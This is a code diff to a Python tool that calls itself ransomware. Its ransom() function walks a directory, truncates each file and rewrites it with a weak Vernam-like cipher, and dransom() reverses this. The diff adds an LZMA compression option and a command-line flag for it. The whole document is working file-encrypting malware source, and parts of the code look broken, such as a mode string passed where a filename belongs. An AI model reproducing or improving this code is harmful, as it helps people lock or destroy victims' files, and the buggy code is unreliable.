@@ -2,6 +2,7 @@ import os
 import sys
 import base64
 import time
+import lzma
 
 def getListOfFiles(dirName):
     listOfFile = os.listdir(dirName)
@@ -45,6 +46,15 @@ def vernan(string, password, mode):
     else:
         if verbose:
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] Size of encrypted file: {len(aux)/1024} kilobytes")
+
+            if compression and verbose:
+                 print("Encoding and compress...")
+                 aux = (aux[:-1]).encode("utf-8")
+                 obj = lzma.LZMAFile(mode, "wb")
+                 print("Writing to file")
+                 obj.write(aux)
+                 obj.close()
+                 return 0
         return aux[:-1]
 
 def ransom(passw, ext, path):
@@ -73,13 +83,18 @@ def ransom(passw, ext, path):
             f.close()
             try:
                 f = open(files[i], "r+")
+                route = files[i]
             except Exception as err:
                 f = open(f"{files[i]}.{ext}", "r+")
+                route = f"{files[i]}.{ext}"
             f.seek(0)
             f.truncate()
             if verbose:
                 print(f"[{str(int(round(time.time() * 1000)))[6:]}] Starting encryption...")
-            f.write("".join(vernan(fContent, passw, "f")))
+            if compression:
+                vernan(fContent, passw, route) 
+            else:
+                f.write("".join(vernan(fContent, passw, "f")))
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" encrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingEncryptionTime)} milliseconds.\n")
             f.close()
         i += 1
@@ -101,6 +116,14 @@ def dransom(passw, ext, path):
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] Decrypting file {files[i]}...")
             f = open(files[i], "r+")
             fContent = f.read()
+
+# Decompress
+            if compression:
+                print("Staring decompression...")
+                with lzma.open(files[i], "r+b", "utf-8") as lzmaFile:
+#                obj = lzma.LZMAFile(files[i], mode="r")
+                    fContent = lzmaFile.read()
+
             fContent = fContent.split("+")
             if os.path.splitext(files[i])[1]:
                 if os.path.splitext(files[i])[1] == f".{ext}":
@@ -126,6 +149,7 @@ def cli(recursion):
 
     helpMenu = f"""Usage: python smr.py [-option1] [-option2] [...]
  -a,  --adition  Add/Remove file extension to/from file.
+ -c,  --compression  Compress/Decompress the files to reduce end size.
  -d,  --decrypt  Only decrypt. If a non encrypted file is in the path, will be encrypted.
  -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernan or Affine encryption.
  -h,  --help     Open this menu.
@@ -144,6 +168,7 @@ NOTICE: You can lose your files if the ranswomare crash, your pc shutdown or you
             i = 0
         while i < len(sys.argv):
             if sys.argv[i] == '--verbose' or sys.argv[i] == '-v':
+                global verbose
                 verbose = True
 
             if sys.argv[i] == '-e' or sys.argv[i] == '--encrypt':
@@ -163,6 +188,10 @@ NOTICE: You can lose your files if the ranswomare crash, your pc shutdown or you
             if sys.argv[i] == '-a' or sys.argv[i] == '--adition':
                 ext = sys.argv[i+1]
                 i += 1
+
+            if sys.argv[i] == '-c' or sys.argv[i] == '--compression':
+                global compression
+                compression = True
 
             if sys.argv[i] == '--interactive' or sys.argv[i] == '-i':
                 mode = input(f"""Ransomware Assistent:
@@ -205,6 +234,8 @@ Example: abc123
 
 global verbose
 verbose = False
+global compression
+compression = False
 if len(sys.argv) == 1:
     cli("interactive")
 else:
